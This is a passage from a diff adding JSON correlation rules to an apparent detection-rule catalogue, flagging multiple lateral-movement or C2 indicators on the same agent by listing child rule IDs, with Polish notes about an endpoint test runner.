+                      "groups":  [
+                                     "enterprise",
+                                     "kill_chain"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+                                                   "100676"
+                                               ]
+                  },
+                  {
+                      "id":  "100903",
+                      "level":  14,
+                      "frequency":  2,
+                      "timeframe":  600,
+                      "description":  "KILL CHAIN [TA0008]: Multiple lateral movement indicators on same agent",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+                                               "lateral_movement"
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "kill_chain"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+                                                   "100735",
+                                                   "100736",
+                                                   "100870",
+                                                   "100871",
+                                                   "100873"
+                                               ]
+                  },
+                  {
+                      "id":  "100904",
+                      "level":  15,
+                      "frequency":  2,
+                      "timeframe":  600,
+                      "description":  "KILL CHAIN [TA0011]: Multiple C2 indicators on same agent",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+                                               "c2"
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "kill_chain",
+                                     "c2",
+                                     "critical"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+                                                   "100750",
+                                                   "100751",
+                                                   "100752",
+                                                   "100753",
+                                                   "100766"
+                                               ]
+                  }
+              ]
+}
